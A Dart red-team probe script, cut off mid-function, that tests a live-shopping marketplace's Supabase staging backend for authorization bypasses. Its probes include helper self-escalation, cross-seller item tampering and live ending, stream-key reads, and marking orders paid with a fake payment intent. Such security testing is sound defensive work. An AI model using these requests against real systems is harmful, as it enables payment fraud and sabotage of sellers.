// ignore_for_file: avoid_print
/// REDTEAM_BLIND_AG_LIVE_POS_ABACAD_v1 — dart run tool/redteam_blind_ag_20260901T1916.dart
/// NÃO CORRIGIR. Só provar. Prefixo fixtures: RTAG-20260901T1916-
import 'dart:convert';
import 'dart:io';
import 'package:http/http.dart' as http;
import 'live_ops_staging_client.dart';

const prefix = 'RTAG-20260901T1916';

Future<Map<String, dynamic>> req(
  String method,
  String u,
  Map<String, String> h, [
  Object? body,
]) async {
  final encoded = body == null ? null : jsonEncode(body);
  final r = method == 'POST'
      ? await http.post(Uri.parse(u), headers: h, body: encoded)
      : method == 'DELETE'
          ? await http.delete(Uri.parse(u), headers: h)
          : method == 'PATCH'
              ? await http.patch(Uri.parse(u), headers: h, body: encoded)
              : method == 'PUT'
                  ? await http.put(Uri.parse(u), headers: h, body: encoded)
                  : await http.get(Uri.parse(u), headers: h);
  dynamic p;
  try {
    p = r.body.isEmpty ? null : jsonDecode(r.body);
  } catch (_) {
    p = r.body;
  }
  return {'http': r.statusCode, 'body': p, 'raw': r.body};
}

String? idOf(dynamic body) {
  if (body is List && body.isNotEmpty && body.first is Map) {
    final s = '${(body.first as Map)['id'] ?? ''}'.trim();
    return (s.isEmpty || s == 'null') ? null : s;
  }
  if (body is Map && body['id'] != null) {
    final s = '${body['id']}'.trim();
    return (s.isEmpty || s == 'null') ? null : s;
  }
  return null;
}

Map<String, dynamic>? firstMap(dynamic body) {
  if (body is List && body.isNotEmpty && body.first is Map) {
    return Map<String, dynamic>.from(body.first as Map);
  }
  if (body is Map) return Map<String, dynamic>.from(body);
  return null;
}

String? orderIdFromE2E(dynamic body) {
  if (body is Map) {
    final m = Map<String, dynamic>.from(body);
    final direct = '${m['order_id'] ?? ''}'.trim();
    if (direct.isNotEmpty && direct != 'null') return direct;
  }
  return idOf(body);
}

int asInt(dynamic v) {
  if (v is int) return v;
  return int.tryParse('$v') ?? 0;
}

Future<void> main() async {
  final e = loadLiveOpsStagingEnv();
  final url = normalizeSupabaseProjectUrl(envRequire(e, 'SUPABASE_URL'));
  if (!url.contains('fxdknzrqjenzqcvnwqqq')) {
    stderr.writeln('ABORT: wrong project');
    exit(2);
  }
  final anon = envRequire(e, 'SUPABASE_ANON_KEY');
  final svc = envRequire(e, 'SUPABASE_SERVICE_ROLE_KEY');
  final buyerId = envRequire(e, 'LIVE_OPS_TEST_BUYER_ID');
  final sellerId = envRequire(e, 'LIVE_OPS_TEST_SELLER_ID');
  final crashSecret = (e['FLEABER_STAGING_CRASH_INJECT_SECRET'] ?? '').trim();
  final sb = LiveOpsStagingClient(url: url, anonKey: anon, serviceRoleKey: svc);

  final buyerTok = await sb.signIn(
    email: envRequire(e, 'LIVE_OPS_TEST_BUYER_EMAIL'),
    password: envRequire(e, 'LIVE_OPS_TEST_BUYER_PASSWORD'),
  );
  final sellerTok = await sb.signIn(
    email: envRequire(e, 'LIVE_OPS_TEST_SELLER_EMAIL'),
    password: envRequire(e, 'LIVE_OPS_TEST_SELLER_PASSWORD'),
  );

  final BH = {
    'apikey': anon,
    'Authorization': 'Bearer $buyerTok',
    'Content-Type': 'application/json',
    'Prefer': 'return=representation',
  };
  final SH = {
    'apikey': anon,
    'Authorization': 'Bearer $sellerTok',
    'Content-Type': 'application/json',
    'Prefer': 'return=representation',
  };
  final SVC = {
    'apikey': svc,
    'Authorization': 'Bearer $svc',
    'Content-Type': 'application/json',
    'Prefer': 'return=representation',
  };
  final ANON = {
    'apikey': anon,
    'Authorization': 'Bearer $anon',
    'Content-Type': 'application/json',
  };
  final E2E = {
    'apikey': svc,
    'Authorization': 'Bearer $svc',
    'Content-Type': 'application/json',
    if (crashSecret.length >= 16) 'x-fleaber-e2e-secret': crashSecret,
  };

  final helperEmail = '${prefix.toLowerCase()}-helper@staging.fleaber.bot';
  final seller2Email = '${prefix.toLowerCase()}-seller2@staging.fleaber.bot';
  const helperPass = 'RTAG_Helper_2026!x';
  const seller2Pass = 'RTAG_Seller2_2026!x';

  Future<String> ensureUser(String email, String password) async {
    try {
      return await sb.createAdminUser(email: email, password: password);
    } catch (ex) {
      final tok = await sb.signIn(email: email, password: password);
      return sb.userIdForAccessToken(tok);
    }
  }

  final helperId = await ensureUser(helperEmail, helperPass);
  final seller2Id = await ensureUser(seller2Email, seller2Pass);
  await req('POST', '$url/rest/v1/profiles', SVC, {
    'id': helperId,
    'full_name': '$prefix helper',
    'email': helperEmail,
  });
  await req('POST', '$url/rest/v1/profiles', SVC, {
    'id': seller2Id,
    'full_name': '$prefix seller2',
    'email': seller2Email,
  });
  final helperTok = await sb.signIn(email: helperEmail, password: helperPass);
  final seller2Tok = await sb.signIn(email: seller2Email, password: seller2Pass);
  final HH = {
    'apikey': anon,
    'Authorization': 'Bearer $helperTok',
    'Content-Type': 'application/json',
    'Prefer': 'return=representation',
  };
  final S2H = {
    'apikey': anon,
    'Authorization': 'Bearer $seller2Tok',
    'Content-Type': 'application/json',
    'Prefer': 'return=representation',
  };

  Future<Map<String, String?>> makeLive({
    required String seller,
    String title = 'live',
    int qty = 2,
    String kind = 'live_only',
    String? productId,
    String? checkoutProductId,
    String status = 'available',
  }) async {
    final live = await req('POST', '$url/rest/v1/lives', SVC, {
      'seller_id': seller,
      'vendedor_id': seller,
      'title': '$prefix-$title',
      'status': 'live',
      'is_active': true,
      'viewer_count': 1,
    });
    final liveId = idOf(live['body']);
    String? itemId;
    if (liveId != null) {
      final item = await req('POST', '$url/rest/v1/live_items', SVC, {
        'live_id': liveId,
        'ref_code': 'AG${DateTime.now().microsecondsSinceEpoch % 99999}',
        'title': '$prefix-$title-item',
        'price': 7,
        'quantity': qty,
        'status': status,
        'is_active': true,
        'item_kind': kind,
        if (productId != null) 'product_id': productId,
        if (checkoutProductId != null) 'checkout_product_id': checkoutProductId,
      });
      itemId = idOf(item['body']);
    }
    return {'liveId': liveId, 'itemId': itemId, 'liveHttp': '${live['http']}'};
  }

  Future<String?> pendingRes({
    required Map<String, String> headers,
    required String liveId,
    required String itemId,
    required String buyer,
    required String seller,
    String source = 'fleaber_live',
    String status = 'pending',
    int qty = 1,
  }) async {
    final res = await req('POST', '$url/rest/v1/live_reservation_requests', headers, {
      'live_id': liveId,
      'live_item_id': itemId,
      'buyer_id': buyer,
      'seller_id': seller,
      'requested_qty': qty,
      'status': status,
      'source': source,
    });
    return idOf(res['body']);
  }

  Future<Map<String, dynamic>> rowOf(String table, String id, String select) async {
    final r = await req(
      'GET',
      '$url/rest/v1/$table?id=eq.$id&select=$select',
      SVC,
    );
    return firstMap(r['body']) ?? {};
  }

  final findings = <Map<String, dynamic>>[];
  final probes = <Map<String, dynamic>>[];

  void probe(String id, String lens, Map<String, dynamic> d) {
    probes.add({'id': id, 'lens': lens, ...d});
    print('PROBE $id [$lens] ${jsonEncode(d)}');
  }

  Future<void> endLive(String? id) async {
    if (id == null) return;
    await req('PATCH', '$url/rest/v1/lives?id=eq.$id', SVC, {
      'status': 'ended',
      'is_active': false,
    });
  }

  final walletBefore = firstMap(
    (await req(
      'GET',
      '$url/rest/v1/wallets?user_id=eq.$sellerId&select=available_balance,pending_balance,balance',
      SVC,
    ))['body'],
  );

  // ---------------------------------------------------------------------------
  // AG1 — convert bypass variants (NOT exact AD/AA PATCH/INSERT converted)
  // ---------------------------------------------------------------------------
  final liveA = await makeLive(seller: sellerId, title: 'ag1', qty: 3);
  final liveAId = liveA['liveId'];
  final itemAId = liveA['itemId'];

  if (liveAId != null && itemAId != null) {
    // Source case / alias INSERT accepted (force_pending is case-sensitive)
    for (final src in ['Facebook_Manual', 'FACEBOOK_MANUAL', 'facebook', 'whatsapp', 'staff', 'manual', 'pos']) {
      final ins = await req('POST', '$url/rest/v1/live_reservation_requests', SH, {
        'live_id': liveAId,
        'live_item_id': itemAId,
        'buyer_id': buyerId,
        'seller_id': sellerId,
        'requested_qty': 1,
        'status': 'accepted',
        'source': src,
      });
      final rid = idOf(ins['body']);
      final after = rid == null ? null : await rowOf('live_reservation_requests', rid, 'id,status,source,requested_qty');
      probe('AG1-source-alias-insert-accepted-$src', 'AG1', {
        'http': ins['http'],
        'rid': rid,
        'after': after,
        'open': after != null && '${after['status']}' == 'accepted',
      });
      if (rid != null && '${after?['status']}' == 'accepted') {
        await req('PATCH', '$url/rest/v1/live_reservation_requests?id=eq.$rid', SH, {
          'status': 'rejected',
        });
      }
    }

    // stripe_convert JWT (revoked?) without PI
    final ridStripe = await pendingRes(
      headers: BH,
      liveId: liveAId,
      itemId: itemAId,
      buyer: buyerId,
      seller: sellerId,
    );
    if (ridStripe != null) {
      await req('POST', '$url/rest/v1/rpc/batata_process_live_reservation_request', SH, {
        'p_request_id': ridStripe,
        'p_action': 'accept',
      });
      final scSeller = await req(
        'POST',
        '$url/rest/v1/rpc/batata_live_reservation_stripe_convert',
        SH,
        {'p_request_id': ridStripe},
      );
      final scBuyer = await req(
        'POST',
        '$url/rest/v1/rpc/batata_live_reservation_stripe_convert',
        BH,
        {'p_request_id': ridStripe},
      );
      final scS2 = await req(
        'POST',
        '$url/rest/v1/rpc/batata_live_reservation_stripe_convert',
        S2H,
        {'p_request_id': ridStripe},
      );
      final afterSc = await rowOf('live_reservation_requests', ridStripe, 'status');
      probe('AG1-stripe-convert-jwt', 'AG1', {
        'seller_http': scSeller['http'],
        'seller_body': scSeller['body'],
        'buyer_http': scBuyer['http'],
        'buyer_body': scBuyer['body'],
        's2_http': scS2['http'],
        's2_body': scS2['body'],
        'status_after': afterSc['status'],
        'open': '${afterSc['status']}' == 'converted',
      });
    }

    // Rebind old paid order live_item_id → convert without new PI
    final paid = await req('POST', '$url/functions/v1/sec-fase2-e2e-oversell', E2E, {
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'probe': 'setup_paid_order',
      'initial_qty': 2,
      'shipping_method': 'mao',
    });
    final paidOid = orderIdFromE2E(paid['body']);
    probe('AG1-e2e-paid-order', 'AG1', {
      'http': paid['http'],
      'oid': paidOid,
      'body': paid['body'] is Map ? (paid['body'] as Map)['error'] : null,
    });
    if (paidOid != null) {
      final paidRow = await rowOf(
        'orders',
        paidOid,
        'id,status,amount_paid_cents,stripe_payment_intent_id,live_item_id,live_id,buyer_id,product_id',
      );
      final bindJwt = await req('PATCH', '$url/rest/v1/orders?id=eq.$paidOid', SH, {
        'live_item_id': itemAId,
        'live_id': liveAId,
      });
      final afterBindJwt = await rowOf('orders', paidOid, 'live_item_id,live_id,status,amount_paid_cents');
      probe('AG1-rebind-paid-order-jwt', 'AG1', {
        'http': bindJwt['http'],
        'body': bindJwt['body'],
        'before': paidRow,
        'after': afterBindJwt,
        'open': '${afterBindJwt['live_item_id']}' == itemAId,
      });
      if ('${afterBindJwt['live_item_id']}' != itemAId) {
        await req('PATCH', '$url/rest/v1/orders?id=eq.$paidOid', SVC, {
          'live_item_id': itemAId,
          'live_id': liveAId,
        });
      }
      final afterBind = await rowOf('orders', paidOid, 'live_item_id,live_id,status');
      if ('${afterBind['live_item_id']}' == itemAId && ridStripe != null) {
        final convRpc = await req(
          'POST',
          '$url/rest/v1/rpc/batata_process_live_reservation_request',
          SH,
          {'p_request_id': ridStripe, 'p_action': 'convert'},
        );
        final convPatch = await req(
          'PATCH',
          '$url/rest/v1/live_reservation_requests?id=eq.$ridStripe',
          SH,
          {'status': 'converted'},
        );
        final afterConv = await rowOf('live_reservation_requests', ridStripe, 'status,requested_qty');
        probe('AG1-convert-via-rebound-paid-order', 'AG1', {
          'rpc_http': convRpc['http'],
          'rpc_body': convRpc['body'],
          'patch_http': convPatch['http'],
          'patch_body': convPatch['body'],
          'status': afterConv['status'],
          'open': '${afterConv['status']}' == 'converted',
          'note': 'NEW: reuse other SKU payment, not exact AD1 unpaid convert',
        });
      }

      // Second reservation same buyer — one PI two converts
      final rid2 = await pendingRes(
        headers: BH,
        liveId: liveAId,
        itemId: itemAId,
        buyer: buyerId,
        seller: sellerId,
      );
      if (rid2 != null) {
        await req('POST', '$url/rest/v1/rpc/batata_process_live_reservation_request', SH, {
          'p_request_id': rid2,
          'p_action': 'accept',
        });
        final conv2 = await req(
          'POST',
          '$url/rest/v1/rpc/batata_process_live_reservation_request',
          SH,
          {'p_request_id': rid2, 'p_action': 'convert'},
        );
        final after2 = await rowOf('live_reservation_requests', rid2, 'status');
        probe('AG1-one-pi-two-converts', 'AG1', {
          'rpc_http': conv2['http'],
          'rpc_body': conv2['body'],
          'status': after2['status'],
          'open': '${after2['status']}' == 'converted',
        });
      }
    }

    // reconcile with aguarda_confirmacao unpaid
    final ghostOrd = await req('POST', '$url/rest/v1/orders', BH, {
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'status': 'aguarda_confirmacao',
      'price_total': 7,
      'quantity': 1,
      'live_id': liveAId,
      'live_item_id': itemAId,
      'payment_method': 'mbway',
    });
    final ghostOid = idOf(ghostOrd['body']);
    probe('AG1-insert-aguarda-confirmacao', 'AG1', {
      'http': ghostOrd['http'],
      'oid': ghostOid,
      'status': firstMap(ghostOrd['body'])?['status'],
    });
    if (ghostOid != null) {
      final rec = await req(
        'POST',
        '$url/rest/v1/rpc/batata_live_reconcile_stripe_order',
        SH,
        {'p_order_id': ghostOid},
      );
      probe('AG1-reconcile-aguarda-confirmacao', 'AG1', {
        'http': rec['http'],
        'body': rec['body'],
        'open': '${rec['body']}'.toLowerCase().contains('converted') ||
            (rec['body'] is Map && rec['body']['ok'] == true),
      });
    }

    // Status aliases on reservation
    final ridAlias = await pendingRes(
      headers: BH,
      liveId: liveAId,
      itemId: itemAId,
      buyer: buyerId,
      seller: sellerId,
    );
    if (ridAlias != null) {
      for (final st in ['Converted', 'CONVERTIDO', 'sold', 'paid', 'completed', 'vendido']) {
        final p = await req(
          'PATCH',
          '$url/rest/v1/live_reservation_requests?id=eq.$ridAlias',
          SH,
          {'status': st},
        );
        final after = await rowOf('live_reservation_requests', ridAlias, 'status');
        probe('AG1-status-alias-$st', 'AG1', {
          'http': p['http'],
          'after': after['status'],
          'open': '${after['status']}' == 'converted',
        });
      }
    }

    // facebook_manual RPC convert (control-ish but via RPC not exact AD PATCH)
    final ridFm = await pendingRes(
      headers: SH,
      liveId: liveAId,
      itemId: itemAId,
      buyer: buyerId,
      seller: sellerId,
      source: 'facebook_manual',
    );
    if (ridFm != null) {
      await req('POST', '$url/rest/v1/rpc/batata_process_live_reservation_request', SH, {
        'p_request_id': ridFm,
        'p_action': 'accept',
      });
      final convFm = await req(
        'POST',
        '$url/rest/v1/rpc/batata_process_live_reservation_request',
        SH,
        {'p_request_id': ridFm, 'p_action': 'convert'},
      );
      final afterFm = await rowOf('live_reservation_requests', ridFm, 'status,source');
      probe('AG1-rpc-convert-facebook-manual', 'AG1', {
        'http': convFm['http'],
        'body': convFm['body'],
        'after': afterFm,
        'open': '${afterFm['status']}' == 'converted',
        'note': 'RPC path, not exact AD1-patch',
      });
    }
  }

  // ---------------------------------------------------------------------------
  // AG2 — staff/helper
  // ---------------------------------------------------------------------------
  await req('DELETE', '$url/rest/v1/seller_helpers?seller_id=eq.$sellerId&helper_user_id=eq.$helperId', SVC);
  final inv = await req('POST', '$url/rest/v1/seller_helpers', SH, {
    'seller_id': sellerId,
    'helper_user_id': helperId,
    'invited_by': sellerId,
    'display_name': '$prefix helper',
    'invited_email': helperEmail,
    'invitation_status': 'pending',
    'active': true,
    'permissions': {
      'can_view_live_dashboard': true,
      'can_manage_reservations': false,
      'can_mark_items_sold': false,
      'can_change_current_item': false,
    },
  });
  final helperRowId = idOf(inv['body']);
  probe('AG2-invite-helper', 'AG2', {'http': inv['http'], 'id': helperRowId, 'body': inv['body']});

  if (helperRowId != null) {
    final escalate = await req(
      'PATCH',
      '$url/rest/v1/seller_helpers?id=eq.$helperRowId',
      HH,
      {
        'invitation_status': 'accepted',
        'responded_at': DateTime.now().toUtc().toIso8601String(),
        'permissions': {
          'can_view_live_dashboard': true,
          'can_manage_reservations': true,
          'can_mark_items_sold': true,
          'can_change_current_item': true,
        },
      },
    );
    final afterEsc = await rowOf(
      'seller_helpers',
      helperRowId,
      'invitation_status,permissions,active',
    );
    final perms = afterEsc['permissions'];
    final gotManage = perms is Map && perms['can_manage_reservations'] == true;
    probe('AG2-helper-self-escalate', 'AG2', {
      'http': escalate['http'],
      'body': escalate['body'],
      'after': afterEsc,
      'open': gotManage,
    });

    if (liveAId != null && itemAId != null) {
      final ridH = await pendingRes(
        headers: BH,
        liveId: liveAId,
        itemId: itemAId,
        buyer: buyerId,
        seller: sellerId,
      );
      if (ridH != null) {
        final accH = await req(
          'POST',
          '$url/rest/v1/rpc/batata_process_live_reservation_request',
          HH,
          {'p_request_id': ridH, 'p_action': 'accept'},
        );
        final convH = await req(
          'POST',
          '$url/rest/v1/rpc/batata_process_live_reservation_request',
          HH,
          {'p_request_id': ridH, 'p_action': 'convert'},
        );
        final afterH = await rowOf('live_reservation_requests', ridH, 'status');
        probe('AG2-escalated-helper-accept-convert', 'AG2', {
          'accept_http': accH['http'],
          'accept_body': accH['body'],
          'convert_http': convH['http'],
          'convert_body': convH['body'],
          'status': afterH['status'],
          'open_accept': '${accH['body']}'.contains('accepted') ||
              (accH['body'] is Map && accH['body']['ok'] == true),
          'open_convert': '${afterH['status']}' == 'converted',
        });
      }
    }
  }

  // View-only helper (reset perms via service) + can_change_current_item mark_sold
  if (helperRowId != null) {
    await req('PATCH', '$url/rest/v1/seller_helpers?id=eq.$helperRowId', SVC, {
      'invitation_status': 'accepted',
      'active': true,
      'permissions': {
        'can_view_live_dashboard': true,
        'can_manage_reservations': false,
        'can_mark_items_sold': false,
        'can_change_current_item': true,
      },
    });
    final liveMark = await makeLive(seller: sellerId, title: 'ag2mark', qty: 1);
    if (liveMark['itemId'] != null) {
      final mk = await req(
        'POST',
        '$url/rest/v1/rpc/batata_mark_live_item_sold',
        HH,
        {'p_live_item_id': liveMark['itemId']},
      );
      final afterMk = await rowOf('live_items', liveMark['itemId']!, 'status,is_active');
      probe('AG2-change-current-item-mark-sold', 'AG2', {
        'http': mk['http'],
        'body': mk['body'],
        'item': afterMk,
        'open': '${afterMk['status']}' == 'sold' ||
            (mk['body'] is Map && mk['body']['ok'] != false && '${mk['http']}' == '200'),
      });
      await endLive(liveMark['liveId']);
    }
    await req('PATCH', '$url/rest/v1/seller_helpers?id=eq.$helperRowId', SVC, {
      'permissions': {
        'can_view_live_dashboard': true,
        'can_manage_reservations': false,
        'can_mark_items_sold': false,
        'can_change_current_item': false,
      },
    });
    final viewConv = (liveAId != null && itemAId != null)
        ? await req('POST', '$url/rest/v1/rpc/batata_process_live_reservation_request', HH, {
            'p_request_id': '00000000-0000-0000-0000-000000000001',
            'p_action': 'convert',
          })
        : {'http': 0, 'body': 'skip'};
    probe('AG2-view-only-rpc', 'AG2', {
      'http': viewConv['http'],
      'body': viewConv['body'],
    });
  }

  // ---------------------------------------------------------------------------
  // AG3 — stock / Hub ghost surfaces (NOT exact discovery exhausted view)
  // ---------------------------------------------------------------------------
  final liveGhost = await makeLive(seller: sellerId, title: 'ag3ghost', qty: 1);
  final gLive = liveGhost['liveId'];
  final gItem = liveGhost['itemId'];
  if (gLive != null && gItem != null) {
    final ridG = await pendingRes(
      headers: BH,
      liveId: gLive,
      itemId: gItem,
      buyer: buyerId,
      seller: sellerId,
    );
    if (ridG != null) {
      await req('POST', '$url/rest/v1/rpc/batata_process_live_reservation_request', SH, {
        'p_request_id': ridG,
        'p_action': 'accept',
      });
    }
    final stock = await req('POST', '$url/rest/v1/rpc/batata_live_item_stock', BH, {
      'p_live_item_id': gItem,
    });
    final restLi = await req(
      'GET',
      '$url/rest/v1/live_items?id=eq.$gItem&select=id,status,quantity,is_active',
      BH,
    );
    final restAnon = await req(
      'GET',
      '$url/rest/v1/live_items?id=eq.$gItem&select=id,status,quantity,is_active',
      ANON,
    );
    final hub = await req(
      'GET',
      '$url/rest/v1/hub_live_items_public?id=eq.$gItem&select=id,status',
      BH,
    );
    final disc = await req(
      'GET',
      '$url/rest/v1/hub_live_items_discovery_public?id=eq.$gItem&select=id,status',
      BH,
    );
    final fomo = await req('POST', '$url/rest/v1/rpc/batata_hub_live_fomo_snapshot', BH, {
      'p_live_id': gLive,
    });
    final restN = restLi['body'] is List ? (restLi['body'] as List).length : -1;
    final hubN = hub['body'] is List ? (hub['body'] as List).length : -1;
    final discN = disc['body'] is List ? (disc['body'] as List).length : -1;
    probe('AG3-rest-live-items-vs-hub-after-accept', 'AG3', {
      'stock': stock['body'],
      'rest_n': restN,
      'rest_row': firstMap(restLi['body']),
      'anon_n': restAnon['body'] is List ? (restAnon['body'] as List).length : -1,
      'hub_n': hubN,
      'disc_n': discN,
      'fomo': fomo['body'],
      'open_rest_ghost': restN > 0 && asInt((stock['body'] is Map) ? stock['body']['available_qty'] : 0) <= 0,
      'open_hub': hubN > 0,
      'open_disc': discN > 0,
    });
  }

  // ---------------------------------------------------------------------------
  // AG4 — mark_sold variants (NOT exact PATCH status=sold)
  // ---------------------------------------------------------------------------
  final mkt = await req('POST', '$url/rest/v1/products', SVC, {
    'seller_id': sellerId,
    'title': '$prefix-mkt',
    'price': 11,
    'quantity': 4,
    'list_on_marketplace': true,
    'is_sold': false,
  });
  final mktId = idOf(mkt['body']);
  final liveOnly = await makeLive(
    seller: sellerId,
    title: 'ag4lo',
    qty: 1,
    kind: 'live_only',
    checkoutProductId: mktId,
  );
  if (liveOnly['itemId'] != null && mktId != null) {
    final mk = await req(
      'POST',
      '$url/rest/v1/rpc/batata_mark_live_item_sold',
      SH,
      {'p_live_item_id': liveOnly['itemId']},
    );
    final prodAfter = await rowOf('products', mktId, 'is_sold,list_on_marketplace,quantity');
    final itemAfter = await rowOf('live_items', liveOnly['itemId']!, 'status,is_active,quantity');
    probe('AG4-mark-sold-live-only-checkout-product', 'AG4', {
      'http': mk['http'],
      'body': mk['body'],
      'product': prodAfter,
      'item': itemAfter,
      'open_unlist': prodAfter['is_sold'] == true || prodAfter['list_on_marketplace'] == false,
      'open_item_sold': '${itemAfter['status']}' == 'sold',
      'note': 'NEW: hitch marketplace SKU via checkout_product_id on live_only',
    });
  }

  final liveSold = await makeLive(seller: sellerId, title: 'ag4aliases', qty: 1);
  if (liveSold['itemId'] != null) {
    for (final st in ['Sold', 'SOLD', 'vendido', 'sold_out', 'paused', 'inactive']) {
      final p = await req('PATCH', '$url/rest/v1/live_items?id=eq.${liveSold['itemId']}', SH, {
        'status': st,
      });
      final after = await rowOf('live_items', liveSold['itemId']!, 'status');
      probe('AG4-status-alias-$st', 'AG4', {
        'http': p['http'],
        'after': after['status'],
        'open_sold': '${after['status']}'.toLowerCase() == 'sold',
      });
    }
    final q0 = await req('PATCH', '$url/rest/v1/live_items?id=eq.${liveSold['itemId']}', SH, {
      'quantity': 0,
    });
    final ia = await req('PATCH', '$url/rest/v1/live_items?id=eq.${liveSold['itemId']}', SH, {
      'is_active': false,
    });
    probe('AG4-qty0-is-active-false', 'AG4', {
      'qty_http': q0['http'],
      'qty_body': q0['body'],
      'ia_http': ia['http'],
      'after': await rowOf('live_items', liveSold['itemId']!, 'quantity,is_active,status'),
    });
  }
  if (mktId != null) {
    final pSold = await req('PATCH', '$url/rest/v1/products?id=eq.$mktId', SH, {
      'is_sold': true,
      'list_on_marketplace': false,
    });
    probe('AG4-direct-product-unlist', 'AG4', {
      'http': pSold['http'],
      'after': await rowOf('products', mktId, 'is_sold,list_on_marketplace'),
    });
  }

  // ---------------------------------------------------------------------------
  // AG5 — live_id / qty
  // ---------------------------------------------------------------------------
  final liveMove = await makeLive(seller: sellerId, title: 'ag5move', qty: 2);
  final liveS2 = await makeLive(seller: seller2Id, title: 'ag5s2', qty: 1);
  if (liveMove['itemId'] != null && liveS2['liveId'] != null) {
    final infl = await req('PATCH', '$url/rest/v1/live_items?id=eq.${liveMove['itemId']}', SH, {
      'quantity': 99,
    });
    probe('AG5-inflate-qty', 'AG5', {
      'http': infl['http'],
      'after': await rowOf('live_items', liveMove['itemId']!, 'quantity'),
      'open': asInt((await rowOf('live_items', liveMove['itemId']!, 'quantity'))['quantity']) >= 99,
    });
    final mv = await req('PATCH', '$url/rest/v1/live_items?id=eq.${liveMove['itemId']}', SH, {
      'live_id': liveS2['liveId'],
    });
    final afterMv = await rowOf('live_items', liveMove['itemId']!, 'live_id');
    probe('AG5-move-item-cross-seller-empty', 'AG5', {
      'http': mv['http'],
      'body': mv['body'],
      'after_live': afterMv['live_id'],
      'open': '${afterMv['live_id']}' == liveS2['liveId'],
    });
    if (liveS2['itemId'] != null) {
      final steal = await req('PATCH', '$url/rest/v1/live_items?id=eq.${liveS2['itemId']}', SH, {
        'quantity': 50,
      });
      probe('AG5-patch-other-seller-item', 'AG5', {
        'http': steal['http'],
        'body': steal['body'],
        'open': (steal['http'] as int) < 400,
      });
    }
  }
  if (liveAId != null && itemAId != null) {
    final ridB = await pendingRes(
      headers: BH,
      liveId: liveAId,
      itemId: itemAId,
      buyer: buyerId,
      seller: sellerId,
    );
    if (ridB != null && liveMove['itemId'] != null) {
      final hijack = await req(
        'PATCH',
        '$url/rest/v1/live_reservation_requests?id=eq.$ridB',
        BH,
        {'live_item_id': liveMove['itemId'], 'requested_qty': 9},
      );
      final afterHij = await rowOf('live_reservation_requests', ridB, 'live_item_id,requested_qty,status');
      probe('AG5-buyer-hijack-live-item-qty', 'AG5', {
        'http': hijack['http'],
        'after': afterHij,
        'open_item': '${afterHij['live_item_id']}' == liveMove['itemId'],
        'open_qty': asInt(afterHij['requested_qty']) >= 9,
      });
    }
  }

  // ---------------------------------------------------------------------------
  // AG6 — race two accepts stock=1
  // ---------------------------------------------------------------------------
  final liveRace = await makeLive(seller: sellerId, title: 'ag6race', qty: 1);
  if (liveRace['liveId'] != null && liveRace['itemId'] != null) {
    final ra = await pendingRes(
      headers: BH,
      liveId: liveRace['liveId']!,
      itemId: liveRace['itemId']!,
      buyer: buyerId,
      seller: sellerId,
    );
    final rb = await pendingRes(
      headers: S2H,
      liveId: liveRace['liveId']!,
      itemId: liveRace['itemId']!,
      buyer: seller2Id,
      seller: sellerId,
    );
    if (ra != null && rb != null) {
      final results = await Future.wait([
        req('POST', '$url/rest/v1/rpc/batata_process_live_reservation_request', SH, {
          'p_request_id': ra,
          'p_action': 'accept',
        }),
        req('POST', '$url/rest/v1/rpc/batata_process_live_reservation_request', SH, {
          'p_request_id': rb,
          'p_action': 'accept',
        }),
      ]);
      final sa = await rowOf('live_reservation_requests', ra, 'status,requested_qty');
      final sb = await rowOf('live_reservation_requests', rb, 'status,requested_qty');
      final accepted = [sa, sb].where((x) => '${x['status']}' == 'accepted').length;
      probe('AG6-parallel-accept-stock1', 'AG6', {
        'a_http': results[0]['http'],
        'b_http': results[1]['http'],
        'a': sa,
        'b': sb,
        'accepted_n': accepted,
        'open': accepted >= 2,
      });
    }
  }

  // ---------------------------------------------------------------------------
  // AG7 — cross-seller sabotage / mux
  // ---------------------------------------------------------------------------
  if (liveAId != null) {
    final endS2 = await req('PATCH', '$url/rest/v1/lives?id=eq.$liveAId', S2H, {
      'status': 'ended',
      'is_active': false,
    });
    final afterEnd = await rowOf('lives', liveAId, 'status,is_active');
    probe('AG7-seller2-end-live', 'AG7', {
      'http': endS2['http'],
      'body': endS2['body'],
      'after': afterEnd,
      'open': '${afterEnd['status']}' == 'ended',
    });
    final muxB = await req(
      'GET',
      '$url/rest/v1/lives?id=eq.$liveAId&select=id,mux_stream_key,stream_key,mux_playback_id',
      BH,
    );
    final muxAnon = await req(
      'GET',
      '$url/rest/v1/lives?id=eq.$liveAId&select=id,mux_stream_key,stream_key',
      ANON,
    );
    final muxRow = firstMap(muxB['body']);
    final key = '${muxRow?['mux_stream_key'] ?? ''}';
    probe('AG7-mux-stream-key-select', 'AG7', {
      'buyer_http': muxB['http'],
      'buyer_keys': muxRow?.keys.toList(),
      'buyer_key_len': key.length,
      'anon_http': muxAnon['http'],
      'anon_body': muxAnon['body'],
      'open': key.isNotEmpty && key != 'null',
    });
    final insAlien = await req('POST', '$url/rest/v1/live_items', S2H, {
      'live_id': liveAId,
      'ref_code': 'HACK',
      'title': 'hijack',
      'price': 1,
      'quantity': 1,
      'status': 'available',
      'is_active': true,
    });
    probe('AG7-insert-item-on-alien-live', 'AG7', {
      'http': insAlien['http'],
      'body': insAlien['body'],
      'open': (insAlien['http'] as int) < 400 && idOf(insAlien['body']) != null,
    });
    final muxEdge = await req('POST', '$url/functions/v1/create-mux-live', S2H, {
      'live_id': liveAId,
    });
    probe('AG7-create-mux-on-alien-live', 'AG7', {
      'http': muxEdge['http'],
      'raw': '${muxEdge['raw']}'.substring(0, ('${muxEdge['raw']}'.length).clamp(0, 400)),
      'open': (muxEdge['http'] as int) < 400,
    });
  }

  // ---------------------------------------------------------------------------
  // AG8 — caixa
  // ---------------------------------------------------------------------------
  final walletAfter = firstMap(
    (await req(
      'GET',
      '$url/rest/v1/wallets?user_id=eq.$sellerId&select=available_balance,pending_balance,balance',
      SVC,
    ))['body'],
  );
  probe('AG8-wallet-delta', 'AG8', {
    'before': walletBefore,
    'after': walletAfter,
  });
  final stampOrd = await req('POST', '$url/rest/v1/orders', BH, {
    'buyer_id': buyerId,
    'seller_id': sellerId,
    'status': 'reserva_pendente',
    'price_total': 7,
    'quantity': 1,
    'payment_method': 'mbway',
  });
  final stampOid = idOf(stampOrd['body']);
  if (stampOid != null) {
    final fakePi = await req('PATCH', '$url/rest/v1/orders?id=eq.$stampOid', SH, {
      'stripe_payment_intent_id': 'pi_fake_rtag',
      'amount_paid_cents': 9999,
      'status': 'pago',
    });
    final afterStamp = await rowOf(
      'orders',
      stampOid,
      'status,amount_paid_cents,stripe_payment_intent_id',
    );
